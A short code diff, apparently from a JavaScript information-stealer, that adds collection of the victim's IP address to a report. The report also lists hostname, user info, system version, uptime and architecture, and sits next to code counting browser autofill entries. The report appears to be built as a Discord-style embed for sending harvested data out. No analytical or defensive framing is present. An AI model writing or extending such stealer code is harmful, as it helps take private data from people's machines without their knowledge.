@@ -1935,7 +1935,7 @@ async function getExtension() {
       autofillCount = autofillEntries.length;
     }
   }
-
+  const ip = await getIp();
   const combinedInfoEmbed = {
     title: ``,
     description: '‎ ',
@@ -1976,6 +1976,7 @@ async function getExtension() {
           `Hostname: ${user.hostname}\n` +
           `User Info: ${user.userInfo}\n` +
           `Version: ${user.version}\n` +
+          `IP Address: ${ip}\n` +
           `Uptime: ${user.uptime}\n` +
           `Type: ${user.type}\n` +
           `Arch: ${user.arch}\n` +
